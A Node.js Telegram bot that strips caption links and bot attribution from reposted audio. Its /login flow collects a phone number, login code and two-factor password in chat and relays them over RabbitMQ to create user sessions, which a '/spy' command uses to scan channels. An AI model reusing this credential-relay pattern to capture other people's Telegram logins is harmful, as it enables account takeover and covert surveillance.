const TelegramBot = require('node-telegram-bot-api')
const dateFormat = require('dateformat')
const amqplib = require('amqplib')
const EventEmitter = require('events')
const uuid = require('uuid');

const token = process.env.TG_BOT_API_TOKEN

const bot = new TelegramBot(token, { polling: true })

class Logger {

    getTimeString() {
        return dateFormat(new Date(), "[yyyy-mm-dd h:MM:ss]")
    }

    info(text) {
        text.split("\n").forEach(string => console.log(`${this.getTimeString()}: ${string}`));
    }

}

const logger = new Logger()

class MessageCheker {

    constructor(msg) {
        this.msg = msg
    }

    isLinkInCaption() {
        return this.msg.caption_entities &&
            this.msg.caption_entities.some(obj => obj.type === 'text_link')
    }

    isSentViaBot() {
        return this.msg.via_bot
    }

}

class AudioCleaner {


    async resendAudio(msg) {
        logger.info("resending audio: " + msg.audio.title + ":" + msg.audio.performer)
        await bot.deleteMessage(msg.chat.id, msg.message_id)
            .catch(console.log)
        await bot.sendAudio(msg.chat.id, msg.audio.file_id)

    }

    handleMessage(msg) {
        logger.info("\n" + "got message in '" + msg.chat.title + "' from  " + msg.author_signature)

        if (!msg.audio) {
            return logger.info("it's not audio - skiping")
        }

        let mcheker = new MessageCheker(msg)
        console.debug(msg)

        let linkInCaption = mcheker.isLinkInCaption()

        if (linkInCaption) {
            logger.info("removing caption: " + msg.caption)
        }

        let viaBot = mcheker.isSentViaBot()

        if (viaBot) {
            logger.info("removing bot refernce: " + msg.via_bot.username)
        }

        if (linkInCaption || viaBot) {
            return this.resendAudio(msg)
        }

        logger.info("it's clear audio, nothing to do")

    }

}

function waitForText(user_id, match = msg => true) {
    return new Promise((res, rej) => {
        const callback = (msg) => {

            if (msg.from.id != user_id) {
                return
            }

            bot.removeListener('text', callback)
            clearTimeout(timeout)
            res(msg.text)
        }

        bot.on('text', callback)

        const timeout = setTimeout(async () => {
            await bot.sendMessage(user_id, 'Bie bie')

            console.log('remove callback')
            bot.removeListener('text', callback)
            rej('ended')
        }, 60_000)

    })
}

async function sendSelect(user_id, text, options) {
    bot.sendMessage(user_id, text, {
        reply_markup: {
            keyboard: [
                options,
            ]
        }
    })

    try {
        const result = await waitForText(user_id)
        if (options.includes(result)) {
            return result
        }
    } catch(e) {
        return false
    }
}


async function main() {
    console.log("connecting to rmq")
    const connection = await amqplib.connect({
        hostname: process.env.RMQ_HOST,
        username: process.env.RMQ_USERNAME,
        password: process.env.RMQ_PASSWORD,
    })

    console.log("setting up bot")

    let acleaner = new AudioCleaner()

    bot.on("channel_post", acleaner.handleMessage.bind(acleaner))
    bot.on("message", acleaner.handleMessage.bind(acleaner))

    const channel = await connection.createConfirmChannel()

    await channel.assertQueue('tg:login', { durable: true })
    await channel.assertQueue('tg:login:answer', { durable: true })
    await channel.assertQueue('curator:event', { durable: true })
    await channel.assertQueue('tg:spy')
    await channel.assertQueue('tg:reply')

    const rpcViaSpyQueue = initRPC({
        channel,
        queue: 'tg:spy',
        reply_queue: 'tg:reply'
    })


    channel.consume('tg:login:answer', async (msg) => {

        try {
            const data = JSON.parse(msg.content.toString())

            const user_id = data.user_id

            if (data.request_password) {
                await bot.sendMessage(user_id, 'Enter 2 auth password:')
                const password = await waitForText(user_id)
                channel.sendToQueue('tg:login', Buffer.from(
                    JSON.stringify({
                        type: 'pass_password',
                        user_id, password
                    })
                ))
            }

            if (data.request_code) {
                console.log('request_code')
                await bot.sendMessage(user_id, 'Enter login code(separate by space some of numbers):')

                const code = await waitForText(user_id)

                channel.sendToQueue('tg:login', Buffer.from(
                    JSON.stringify({
                        type: 'pass_code',
                        user_id, code
                    })
                ))
            }

            if (data.wrong_number) {
                bot.sendMessage(user_id, 'You loh, (wrong number)')
            }

            if (data.request_number) {
                const result = await sendSelect(user_id, 'Select method', [
                    'Pyro',
                    'Tele'
                ])

                if (!result) {
                    return await bot.sendMessage(user_id, 'Unknown type')
                }

                await bot.sendMessage(user_id, 'Enter your phone:')

                const phone = await waitForText(user_id)

                channel.sendToQueue('tg:login', Buffer.from(
                    JSON.stringify({
                        type: 'pass_phone',
                        user_id, phone,
                        method: result
                    })
                ))
            }

            if (data.login_ok) {
                await bot.sendMessage(user_id, 'You are welcome!')
            }

            if (data.scan_summary) {
                bot.sendMessage(user_id, JSON.stringify(data, null, ' '))
            }

        } catch (e) {
            console.error(e)

            // channel.nack()
            // bot.sendMessage(user_id, 'something went wrong')
        } finally {
            channel.ack(msg)
        }

    })


    bot.on('text', async (msg) => {
        const user_id = msg.from.id
        if (msg.chat.type != 'private') {
            return
        }

        if (msg.text.startsWith('/spy')) {
            await bot.sendMessage(user_id, "SPYING ><")


            const sessions = await rpcViaSpyQueue({
                requested_by_user_id: user_id,
            })

            const selected = await sendSelect(user_id, 'Select session to use', sessions)

            if (!selected) {
                return await bot.sendMessage(user_id, 'Bie', {
                    reply_markup: {
                        remove_keyboard: true
                    }
                })
            }

            await bot.sendMessage(user_id, 'Ok, now send tg channel link or username', {
                reply_markup: {
                    remove_keyboard: true
                }
            })
            const identifier = await waitForText(user_id)

            const result = await rpcViaSpyQueue({
                requested_by_user_id: user_id,
                session: selected,
                identifier
            })
            await bot.sendMessage(msg.chat.id, JSON.stringify(result))
            /// curator:spy
        } else if (msg.text == '/login') {
            channel.sendToQueue('curator:event', Buffer.from(
                JSON.stringify({
                    event: 'login_init',
                    login_init: {
                        user_id: msg.from.id,
                        linked_to: null,
                    }
                })
            ))
            channel.sendToQueue('tg:login', Buffer.from(
                JSON.stringify({
                    type: 'login_init',
                    user_id: msg.from.id,
                    linked_to: null,
                })
            ))
        }
    })

    logger.info("started")

}

main()


function initRPC({ channel, queue, reply_queue }) {
    const responseEmitter = new EventEmitter()
    responseEmitter.setMaxListeners(0)

    channel.consume(reply_queue, msg => {
        responseEmitter.emit(msg.properties.correlationId, JSON.parse(msg.content.toString()));
    }, { noAck: true });

    const send = message => resolve => {
        const correlationId = uuid.v4();
        responseEmitter.once(correlationId, resolve);
        channel.sendToQueue(queue, Buffer.from(JSON.stringify(message)), {
            correlationId,
            replyTo: reply_queue,
        });
    }

    return message => new Promise(send(message));
}
